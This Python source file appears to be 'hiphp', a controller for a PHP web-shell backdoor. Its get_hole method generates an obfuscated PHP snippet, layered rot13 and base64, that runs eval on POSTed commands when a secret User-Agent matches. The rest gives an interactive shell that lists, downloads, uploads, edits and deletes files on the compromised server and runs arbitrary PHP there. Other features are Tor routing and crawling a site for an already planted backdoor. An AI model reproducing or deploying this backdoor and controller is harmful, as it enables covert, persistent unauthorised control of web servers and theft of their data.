#!/usr/bin/env python
# coding:utf-8
#   |                                                         |   #
# --+---------------------------------------------------------+-- #
#   |    Code by: yasserbdj96                                 |   #
#   |    Email: yasser.bdj96@gmail.com                        |   #
#   |    GitHub: github.com/yasserbdj96                       |   #
#   |    Sponsor: github.com/sponsors/yasserbdj96             |   #
#   |    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9      |   #
#   |                                                         |   #
#   |    All posts with #yasserbdj96                          |   #
#   |    All views are my own.                                |   #
# --+---------------------------------------------------------+-- #
#   |                                                         |   #

#START{
from hiphp.hiphpversion import __version__
from hiphp.hiphpcoding import rot13,tobase64,tomd5
from hiphp.hiphpphpfunctions import *
from hiphp.hiphphelp import help
from hiphp.hiphpmsgs import *
from hiphp.hiphplicense import license
from hiphp.hiphpabout import about
from hiphp.hiphplogo import *
from hiphp.hiphpeditor import editor
from hiphp.hiphplinkextractor import *
from hiphp.hiphpfunc import *
#from ashar import *
from hexor import *
#from asciitext import *
import requests
import re
import ast
from os.path import exists
#from biglibrary import *
import base64

#
import os
# if OS is Windows:
if os.name == 'nt':
    os.system('color')
    #    import readline
# if OS is Linux:
else:
    try:
        import readline
    except:
        pass

#start hiphp class:
class hiphp:
    #__init__:
    def __init__(self,key,url,retu=False,proxies=""):
        #
        self.key=tomd5(str(key))# Encrypt the 'key' with 'md5'.


        if url.startswith("http://") or url.startswith("https://"):
            self.url = str(url)
        else:
            self.url = "http://" + str(url)
        #self.url=str(url)
        self.retu=retu

        #
        url_w=re.compile(r"https?://(www\.)?")
        self.url_w=url_w.sub('',str(url)).strip().strip('/')
        self.headers={'User-Agent':self.key}

        #colors with hexor:
        self.color=hexor(True,"hex")
        self.color2=hexor(False,"hex")

        #used hex colors in this programm:
        self.c_red="#ea4335"#red
        self.c_white_red="#f3938b"#white-red
        self.c_blue="#4285f4"#blue
        self.c_yellow="#fbbc05"#yellow
        self.c_green="#34a853"#green
        self.c_white="#ffffff"
        #
        self.set=""
        self.cd=""
        self.do_x=0

        self.DS=""

        #
        self.sep=os.sep

        self.proxies=proxies

    def crawl(self,url):
        links = get_all_website_links(url)
    
        for link in links:
            hiphp.check_hiphp_in(self,link)

    def check_hiphp_in(self,url):
        pp11 = hiphp.do(self, self.key, url, self.headers, True, f"echo '{self.key}';")

        if pp11 != self.key:
            self.color2.c(errx + " " + url, self.c_red)
        else:
            self.color2.c(msgs + " " + url, self.c_green)
            self.url = url
            url_w=re.compile(r"https?://(www\.)?")
            self.url_w=url_w.sub('',str(url)).strip().strip('/')
            hiphp.cli(self)
            exit()

    #cli:
    def cli(self):
        self.DS=hiphp.do(self,self.key,self.url,self.headers,True,DIRECTORY_SEPARATOR())
        scanner="n"

        #logo
        logox=""
        if self.do_x==0:
            logox=logo(__version__)
            self.do_x+=1

        #getcwd
        getcwd=""
        try:
            reee=hiphp.do(self,self.key,self.url,self.headers,True,"echo getcwd();")
        except:
            reee=None
        
        #if (emsg_1 in reee) or (reee==None) or (emsg_3 in reee):
        if reee is None or (emsg_1 in reee or emsg_3 in reee):
            #print(reee)
            #exit()
            scanner=input(f"Scan '{self.url}' to find HIPHP_HOLE_CODE (Y/N):")
            
            if scanner.lower()=="y":
                hiphp.crawl(self,self.url)
                
                exit()
                """
                def crawl(url):
                    #all_links=[]
                    #print(f"[*] Crawling: {url}")
                    links = get_all_website_links(url)
                    for link in links:
                        check_hiphp_in(link)
                        crawl(link)

                def check_hiphp_in(url):
                    #self.url=str(url)

                    pp11=hiphp.do(self,self.key,url,self.headers,True,f"echo '{self.key}';")

                    #p0=hiphp(key=self.key,url=url,retu=True)
                    #p1=p0.run(f"mkdir('ccccccc');")
                    #print(pp11)
                    if pp11!=self.key:
                        self.color2.c(errx+" "+url,self.c_red)
                        #print(url+" unsucceed!")
                    else:
                        self.color2.c(msgs+" "+url,self.c_green)
                        self.url=url
                        hiphp.cli(self)
                        #print(url+" Succeed!")
                        exit()
                crawl(self.url)
                exit()
                """
                """
                import requests
                from bs4 import BeautifulSoup
 
                urls_list=[]
                urls = self.url
                grab = requests.get(urls)
                soup = BeautifulSoup(grab.text, 'html.parser')
                for link in soup.find_all("a"):
                    data = link.get('href')
                    urls_list.append(data)
                    #print(data)
                for i in range(len(urls_list)):
                    p1=hiphp(key=self.key,url=urls_list[i],retu=True).run(f"echo '{self.key}';")
                    if p1!=self.key:
                        print(urls_list[i]+" unsucceed!")
                    else:
                        print(urls_list[i]+" Succeed!")
                        exit()
                    #print(p1)
                exit()
                """
            else:
                #hiphp.get_hole(self,get=True)
                exit()
                return reee
        else:
            getcwd=self.color.c(reee,self.c_green)

        #
        xxr1=self.color.c('┌──(',self.c_blue)
        xxr2=self.color.c(')──[',self.c_blue)
        xxr3=self.color.c(']',self.c_blue)
        #xxr4=self.color.c('└─',self.c_blue)+" "
        xxr4=self.color.c('└─HIPHP>',self.c_blue)+" "
        #
        key_w_color=self.color.c(self.key,self.c_red)
        url_w_color=self.color.c(self.url_w,self.c_yellow)
        at=self.color.c("||",self.c_blue)
        print(logox+"\n"+xxr1+key_w_color+at+url_w_color+xxr2+getcwd+xxr3)

        #try:
        command=input(xxr4)
        #except:
        #    exit()
        if command and command!="":
            #help
            if command.lower().startswith("--help") or command.lower().startswith("help"):
            #if command[0:6].lower()=="--help" or command[0:4].lower()=="help":
                try:
                    help(__version__,command.split(" ")[1])
                except:
                    print(help(__version__))
            #version
            elif command.lower().startswith("--version") or command.lower().startswith("version"):
            #elif command[0:9].lower()=="--version" or command[0:7].lower()=="version":
                print(__version__)
            #exit
            elif command.lower().startswith("--exit") or command.lower().startswith("exit"):
            #elif command[0:6].lower()=="--exit" or command[0:4].lower()=="exit":
                exit()
            #license
            elif command.lower().startswith("--license") or command.lower().startswith("license"):
            #elif command[0:9].lower()=="--license" or command[0:7].lower()=="license":
                print(license())
            #about
            elif command.lower().startswith("--about") or command.lower().startswith("about"):
            #elif command[0:7].lower()=="--about" or command[0:5].lower()=="about":
                print(about())
            #chmod
            elif command.lower().startswith("--chmod") or command.lower().startswith("chmod"):
            #elif command[0:7].lower()=="--about" or command[0:5].lower()=="about":
                ppth=command.split(" ")[1:]
                code=chmod(ppth[0],ppth[1])
                #print(code)
                print(hiphp.do(self,self.key,self.url,self.headers,True,code))
                #print(ppth)
            #cp
            elif command.lower().startswith("--mv") or command.lower().startswith("mv"):
            #elif command[0:4].lower()=="--mv" or command[0:2].lower()=="mv":
                ppth=command.split(" ")[1:]
                try:
                    command=simulate_mv(ppth[0],ppth[1])
                    mv_msg=hiphp.do(self,self.key,self.url,self.headers,True,command)
                    print(print_msg_with_c(mv_msg))
                except:
                    help(__version__,"--mv")
            #download
            elif command.lower().startswith("--down") or command.lower().startswith("down") or command.lower().startswith("download"):
                down=command.split(" ")[1:]
                try:
                    if down[0].lower()=="-f":
                        """command=file_get_contents(down[2])
                        content=hiphp.do(self,self.key,self.url,self.headers,True,command)
                        try:
                            out_path=down[3]
                        except:
                            out_path=""
                        finally:
                            f = open(out_path+down[2], "w+")
                            f.write(content)
                            f.close()"""
                        try:
                            out_path=down[2]
                        except:
                            out_path=""
                        print(print_msg_with_c(smsg_1+hiphp.download(self,down[1],out_path)))
                        #print(smsg_1+hiphp.download(self,down[1],out_path))
                    elif down[0].lower()=="-d":
                        try:
                            zip_file_name=hiphp.compress(self,down[1])
                        except:
                            zip_file_name=hiphp.compress(self)
                        #zip_file_name=hiphp.do(self,self.key,self.url,self.headers,True,command)

                        try:
                            out_path=down[2]
                        except:
                            out_path=""
                        print(print_msg_with_c(smsg_1a+hiphp.download(self,zip_file_name,out_path)))
                    elif down[0].lower()=="-all":
                        try:
                            out_path=down[1]
                        except:
                            out_path=""
                        zip_file_name=hiphp.compress(self)
                        print(print_msg_with_c(smsg_1+hiphp.download(self,zip_file_name,out_path)))
                    else:
                        help(__version__,"--down")

                except:
                    help(__version__,"--down")
            #zip
            elif command.lower().startswith("--zip") or command.lower().startswith("zip"):
                
                try:
                    try:
                        ziping=command.split(" ")[1]
                        zip_file_name=hiphp.compress(self,ziping)
                    except:
                        zip_file_name=hiphp.compress(self)
                    print(print_msg_with_c(smsg_2+reee+self.DS+zip_file_name))
                except NameError as e:
                    print(e)
                    help(__version__,"--zip")
            #update
            elif command.lower().startswith("--update") or command.lower().startswith("update"):
                r="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/version.txt"
                version = requests.get(r).text
                version=version.replace('\n', ' ').replace('\r', '').replace(' ', '')
                if version==__version__:
                    new=False
                else:
                    p1,p2,p3=version.split(".")
                    s1,s2,s3=__version__.split(".")
                    if p1>=s1 and p2>=s2 and p3>s3:
                        new=True
                    elif p1>=s1 and p2>s2 and p3<=s3:
                        new=True
                    else:
                        new=False
                if new==True:
                    print(print_msg_with_c(msg_2+version))
                    print(print_msg_with_c(msg_3))
                else:
                    print(print_msg_with_c(msg_4))
            #ls
            elif command.lower().startswith("--ls") or command.lower().startswith("ls"):
                if len(command) == 4 or len(command) == 2:
                    command = scandir()
                elif command.lower().startswith("--ls -all"):
                    dirx = command[10:] if len(command) > 10 else "." + self.DS
                    command = scandir_all(dirx)
                elif command.lower().startswith("ls -all"):
                    dirx = command[8:] if len(command) > 8 else "." + self.DS
                    command = scandir_all(dirx)
                else:
                    dirx = command[5:] if len(command) == 4 else command[3:]
                    if dirx[-1] != self.DS:
                        dirx += self.DS
                    command = scandir(dirx)

                sd = hiphp.do(self, self.key, self.url, self.headers, True, command)
                x = ast.literal_eval(sd)

                for i in range(len(x)):
                    if x[i] not in (".", ".."):
                        x[i] = x[i].replace("\/", "/")

                separators = " | " if len(x) > 1 else ""
                if len(x) > 0:
                    print(lslist(x, separator=separators))
                #print(lslist(x, separator=separators))
                """elif command[0:4].lower()=="--ls" or command[0:2].lower()=="ls":
                if len(command)==4 or len(command)==2:
                    command=scandir()
                elif command[0:4].lower()=="--ls" and command[5:9].lower()=="-all":
                    dirx=command[10:]
                    if dirx=="":
                        dirx="."+self.DS
                    command=scandir_all(dirx)
                elif command[0:2].lower()=="ls" and command[3:7].lower()=="-all":
                    dirx=command[8:]
                    if dirx=="":
                        dirx="."+self.DS
                    command=scandir_all(dirx)
                else:
                    if len(command)==4:
                        dirx=command[5:]
                    else:
                        dirx=command[3:]
                    
                    if dirx[-1]!=self.DS:
                        dirx+=self.DS
                    command=scandir(dirx)
                sd=hiphp.do(self,self.key,self.url,self.headers,True,command)
                x=ast.literal_eval(sd)

                for i in range(len(x)):
                    if x[i]!="." and x[i]!="..":
                        x[i]=x[i].replace("\/","/")
                if len(x)>1:
                    separators=" | "
                else:
                    separators=""
                print(lslist(x,separator=separators))"""
            #set
            elif command.lower().startswith("--cd") or command.lower().startswith("cd"):
                self.cd = ""
                if command.lower().startswith("--cd"):
                    self.cd = f"chdir('{reee}{self.DS}{command[5:]}');"
                else:
                    self.cd = f"chdir('{reee}{self.DS}{command[3:]}');"
            #set
            elif command.lower().startswith("--set") or command.lower().startswith("set"):
                if command.lower().startswith("--set"):
                    self.set += command[6:]
                else:
                    self.set += command[4:]
            #delete set
            elif command.lower().startswith("--dset") or command.lower().startswith("dset"):
            #elif command[0:6].lower()=="--dset" or command[0:4].lower()=="dset":
                self.set=""
            #clear
            elif command.lower().startswith("--cls") or command.lower().startswith("cls"):
            #elif command[0:5].lower()=="--cls" or command[0:3].lower()=="cls":
                os.system('cls' if os.name == 'nt' else 'clear')
            #Get the hole Code
            elif command.lower().startswith("--geth") or command.lower().startswith("geth") or command.lower().startswith("HIPHP_HOLE_CODE"):
            #elif command[0:6].lower()=="--geth" or command[0:15].upper()=="HIPHP_HOLE_CODE" or command[0:4].lower()=="geth":
                hiphp.get_hole(self,get=True)
            #cat
            elif command.lower().startswith("--cat") or command.lower().startswith("cat"):
                if command.lower().startswith("--cat"):
                    dirx = command[6:]
                else:
                    dirx = command[4:]
    
                command = file_get_contents(dirx)
                hiphp.do(self, self.key, self.url, self.headers, False, command)

            #edt
            elif command.lower().startswith("--edt") or command.lower().startswith("edt") or command.lower().startswith("edit") or command.lower().startswith("--edit"):
                dirx = command.split(" ")[1]

                xxnn=hiphp.do(self,self.key,self.url,self.headers,True,"echo $_SERVER['SCRIPT_FILENAME'];")
                xxnnb=hiphp.do(self,self.key,self.url,self.headers,True,"echo getcwd();")
                
                ish=xxnn.replace(xxnnb,"")
                if ish==dirx or ish==self.DS+dirx or ish=="."+self.DS+dirx:
                    ttx=self.color.c("[!] Edit ",self.c_red)+self.color.c(f"'{xxnn}'",self.c_yellow)+ self.color.c("? This may cause errors or login issues (Y/N): ",self.c_red)
                    doyou=input(ttx)
                    if doyou.lower()=="y":
                        old_url_w=self.url_w
                        old_url=self.url
                        out_path = hiphp.download(self, dirx, "")
                        if editor(out_path)!="q":

                            original_path = out_path
                            extension = os.path.splitext(original_path)[1]
                            new_filename = os.path.splitext(original_path)[0] + "_hiphphole" + extension

                            new_path = os.path.join(os.path.dirname(original_path), new_filename)

                            # Perform the file copy operation
                            with open(original_path, 'rb') as src_file, open(new_path, 'wb') as dest_file:
                                dest_file.write(src_file.read())

                            hiphp.upload(self, new_path)


                            basenamef=os.path.basename(dirx)
                            ccvvbb=os.path.splitext(basenamef)

                            self.url=self.url.replace(os.path.basename(xxnn),ccvvbb[0]+"_hiphphole"+ccvvbb[1])
                            url_w=re.compile(r"https?://(www\.)?")
                            self.url_w=url_w.sub('',str(self.url)).strip().strip('/')

                            hiphp.run(self, f"unlink('{dirx}');")

                            newcopy=dirx.replace(basenamef,ccvvbb[0]+"_hiphphole"+ccvvbb[1])

                            code=f"""$file_path = '{newcopy}';"""+"""
$new_file_path = str_replace('_hiphphole', '', $file_path);
if (rename($file_path, $new_file_path)) {echo "File edited successfully!";} else {echo "File edit failed.";}
                            
                            """
                            xx=hiphp.run(self, code)

                            print(xx)
                            os.remove(out_path)
                            os.remove(new_filename)
                            self.url=old_url
                            self.url_w=old_url_w

                            hiphp.cli(self)
                            exit()


                        else:
                            hiphp.cli(self)
                        pass
                    else:
                        hiphp.cli(self)
                try:
                    from_path = os.path.dirname(dirx)
                except:
                    from_path = "."
    
                out_path = hiphp.download(self, dirx, "")
                
                if editor(out_path)!="q":
                    hiphp.run(self, f"unlink('{dirx}');")
                
                    if from_path == "":
                        hiphp.upload(self, out_path)
                    else:
                        hiphp.upload(self, out_path, from_path + self.DS)
                    os.remove(out_path)
                else:
                    hiphp.cli(self)

                #os.system('cls' if os.name == 'nt' else 'clear')
                #print(out_path)

            #remove:
            elif command.lower().startswith("--rm") or command.lower().startswith("rm") or command.lower().startswith("delete"):
                dirx = command.split(" ")

                if len(dirx) < 3:
                    help(__version__, "--rm")
                else:
                    try:
                        command = rm(dirx[1], dirx[2])
                        hiphp.do(self, self.key, self.url, self.headers, False, command)
                    except:
                        help(__version__, "--rm")

            # php_info
            elif command.lower().startswith("--phpinfo") or command.lower().startswith("phpinfo"):
                command = php_info()
                hiphp.do(self, self.key, self.url, self.headers, False, command)

            # rf
            elif command.lower().startswith("--rf") or command.lower().startswith("rf") or command.lower().startswith("run"):
                varss = command.split(" ")
                if varss[-1] == "":
                    del varss[-1]
                print(hiphp.run_file(self, varss[1], varss[2:]))

            # up
            elif command.lower().startswith("--up") or command.lower().startswith("up") or command.lower().startswith("upload"):
                v = command.split(" ")
                if len(v) > 2:
                    file_path = v[1]
                    to = v[2]
                    if to[-1:] != self.DS:
                        to += self.DS
                    hiphp.upload(self, file_path, to)
                else:
                    hiphp.upload(self, v[1])
            else:
                comand_return = hiphp.do(self, self.key, self.url, self.headers, True, command)
                if comand_return != "":
                    if re.search(re.escape(emsg_3), comand_return):
                        self.color2.c(emsg_2,self.c_red)
                    else:
                        print(comand_return)
                else:
                    self.color2.c(errx + " " + command + emsg_6, self.c_red)

        else:
            self.color2.c(emsg_2,self.c_red)
        
        #if scanner.lower()=="y":
        hiphp.cli(self)
        #else:
            #exit()

    #do:
    def do(self, key, url, header, retu, command):
        regex = re.compile(r"^https?\:\/\/[\w\-\.]+\.onion")
        proxies_onion = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
        
        try:
            if regex.match(url):
                # .onion
                proxies = proxies_onion
            else:
                proxies = self.proxies if self.proxies != "" else None
                
            response = requests.post(url, headers=header, proxies=proxies, data=self._build_payload(command))
            
            if response.status_code == 200:
                response_text = response.text
                if response_text.startswith("#" + key):
                    response_text = response_text[len(key) + 1:]
                    if retu:
                        return response_text
                    else:
                        if response_text:
                            print(response_text)
                else:
                    if retu:
                        return emsg_1
                    else:
                        hexor().c(emsg_1, self.c_red)
                        exit()
            else:
                raise Exception("Request failed with status code: " + str(response.status_code))
        except Exception as e:
            emsg = emsg_3 + " '" + url + "'."
            if retu:
                return emsg
            else:
                hexor().c(emsg, self.c_red)
                exit()

    def _build_payload(self, command):
        ploads = {'command': self.cd + self.set + command}
        return ploads

    #run_file:
    def run_file(self,file_path,*opts):        
        if exists(file_path):
            open_file=open(file_path).read()
            #
            if open_file[0:5]=="<?php":
                open_file=open_file[6:]
            if open_file[len(open_file)-2:len(open_file)]=="?>":
                open_file=open_file[:len(open_file)-2]
            #
            if len(opts)>0:
                if type(opts[0])==list:
                    opts=opts[0]
                #
                for i in range(len(opts)):
                    value,string=opts[i].split("==")
                    open_file=open_file.replace(f"__{value}__",string)
            
            result=hiphp.do(self,self.key,self.url,self.headers,True,open_file)
            if self.retu==False:
                print(result)
            return result
        else:
            self.color2.c(emsg_4,self.c_red)

    #run:
    def run(self,command):
        if self.retu==True:
            return hiphp.do(self,self.key,self.url,self.headers,True,command)
        else:
            hiphp.do(self,self.key,self.url,self.headers,False,command)

    #upload:
    def upload(self,path_to_upluad,to=""):
        self.DS=hiphp.do(self,self.key,self.url,self.headers,True,DIRECTORY_SEPARATOR())
        try:
            with open(path_to_upluad,"rb") as base64_file:
                encoded_string=tobase64(base64_file.read().decode("utf-8"))
            p=""
            if to!="":
                if to[0:2]!="."+self.DS:
                    p="."+self.DS
                hiphp.run(self,"if(!file_exists('"+p+to+"')){mkdir('"+p+to+"',0777,true);}")
            else:
                pass
            #print(f"{p+to+os.path.basename(path_to_upluad)}")
            hiphp.run(self,f'file_put_contents("{p+to+os.path.basename(path_to_upluad)}", base64_decode("{encoded_string}"), FILE_APPEND | LOCK_EX);')
            #hiphp.run(self,f'Fwrite(fopen("{p+to+os.path.basename(path_to_upluad)}","w+"),base64_decode("{encoded_string}"));')
        except:
            self.color2.c(f"{emsg_5} '{path_to_upluad}'.",self.c_red)

    #compress:
    def compress(self,path=""):
        if path!="":
            command=zip_path(path)
        else:
            command=zip_path()
        zip_file_name=hiphp.do(self,self.key,self.url,self.headers,True,command)
        if self.retu==False:
            print(zip_file_name)
        return zip_file_name

    #download:
    def download(self,path_x,outpath=""):
        def get_download_folder():
            if os.name == 'nt':  # Windows
                download_folder = os.path.expanduser('~/Downloads')
            elif os.name == 'posix':  # Linux, macOS, and other UNIX-based systems
                download_folder = os.path.expanduser('~/Downloads')
            else:
                # Unsupported operating system
                download_folder = None

            return download_folder
        download_folder = get_download_folder()
        if download_folder:
            outpath=download_folder
        else:
            outpath=os.path.abspath(os.getcwd())

        new_command=file_to_b64(path_x)
        path_x=os.path.basename(path_x)
        #if outpath=="":
        #    outpath=os.path.abspath(os.getcwd())
        
        if outpath[-1]!=self.sep:
            outpath+=self.sep

        down_path=outpath+""+path_x

        zip_file_b64_content=hiphp.do(self,self.key,self.url,self.headers,True,new_command)
        with open(down_path, 'wb') as f:  
            f.write(base64.b64decode(zip_file_b64_content))
        f.close()

        if self.retu==False:
            print(down_path)
        return down_path

    #get the hole:
    def get_hole(self,get=False):
        code="if($_SERVER['HTTP_USER_AGENT']=='"+self.key+"'){echo'#"+self.key+"';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
        code=rot13(tobase64(rot13(tobase64(rot13(code)))))
        code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('{code}'))))));"
        php_s="/*HIPHP_HOLE_CODE START*/"
        php_e="/*HIPHP_HOLE_CODE END*/"

        if self.retu==True and get==False:
            return php_s+"\n"+code+"\n"+php_e
        else:
            geth=self.color.c(msg_1+"\n",self.c_yellow)
            geth+=self.color.c(php_s+"\n",self.c_red)
            geth+=self.color.c(code+"\n",self.c_green)
            geth+=self.color.c(php_e,self.c_red)
            print(geth)
#}END.